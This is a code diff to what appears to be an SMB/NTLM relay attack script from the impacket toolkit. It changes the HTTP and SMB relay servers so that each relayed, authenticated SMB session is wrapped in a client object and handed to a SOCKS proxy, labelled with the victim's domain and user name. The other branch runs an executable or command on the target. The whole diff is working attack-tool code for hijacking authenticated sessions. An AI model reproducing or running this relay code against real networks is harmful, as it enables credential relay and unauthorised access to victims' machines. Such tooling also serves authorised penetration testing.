@@ -42,6 +42,7 @@ import base64
 import logging
 import os
 import sys
+from urlparse import urlparse
 from binascii import unhexlify, hexlify
 from struct import pack, unpack
 from threading import Thread
@@ -54,6 +55,7 @@ from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.examples import logger
 from impacket.examples import serviceinstall
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections, SOCKS
+from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
 from impacket.nt_errors import ERROR_MESSAGES
 from impacket.nt_errors import STATUS_LOGON_FAILURE, STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_NOT_SUPPORTED, \
     STATUS_MORE_PROCESSING_REQUIRED
@@ -591,8 +593,14 @@ class HTTPRelayServer(Thread):
                         ATTACKED_HOSTS.add(self.target)
                         if self.server.runSocks is True:
                             # Pass all the data to the socksplugins proxy
+                            protocolClient = SMBRelayClient(None,urlparse('smb://%s' % self.target))
+                            protocolClient.session = SMBConnection(existingConnection=self.client)
                             activeConnections.put(
-                                (self.target, 445, authenticateMessage['user_name'], self.client, {'CHALLENGE_MESSAGE': self.challengeMessage}))
+                                (self.target, 445, 'SMB', ('%s/%s' % (
+                                authenticateMessage['domain_name'].decode('utf-16le'),
+                                authenticateMessage['user_name'].decode('utf-16le'))).upper(),
+                                 protocolClient,
+                                 {'CHALLENGE_MESSAGE': self.challengeMessage}))
                             logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
                         else:
                             clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
@@ -912,7 +920,13 @@ class SMBRelayServer(Thread):
                     ATTACKED_HOSTS.add(self.target)
                     if self.runSocks is True:
                         # Pass all the data to the socksplugins proxy
-                        activeConnections.put((self.target, 445, authenticateMessage['user_name'], smbClient, connData))
+                        protocolClient = SMBRelayClient(None, urlparse('smb://%s' % self.target))
+                        protocolClient.session = SMBConnection(existingConnection=smbClient)
+                        activeConnections.put((self.target, 445, 'SMB',
+                                               ('%s/%s' % (
+                                                   authenticateMessage['domain_name'].decode('utf-16le'),
+                                                   authenticateMessage['user_name'].decode('utf-16le'))).upper(),
+                                               protocolClient, connData))
                         logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
                         del (smbData[self.target])
                     else:
@@ -996,7 +1010,13 @@ class SMBRelayServer(Thread):
                 ATTACKED_HOSTS.add(self.target)
                 if self.runSocks is True:
                     # Pass all the data to the socksplugins proxy
-                    activeConnections.put((self.target, 445, smbClient, connData))
+                    protocolClient = SMBRelayClient(None, urlparse('smb://%s' % self.target))
+                    protocolClient.session = SMBConnection(existingConnection=smbClient)
+                    activeConnections.put((self.target, 445, 'SMB',
+                                           ('%s/%s' % (
+                                               sessionSetupData['PrimaryDomain'],
+                                               sessionSetupData['Account'])).upper(),
+                                           protocolClient, connData))
                     logging.info("Adding %s(445) to active SOCKS connection. Enjoy" % self.target)
                     # Remove the target server from our connection list, the work is done
                     del (smbData[self.target])
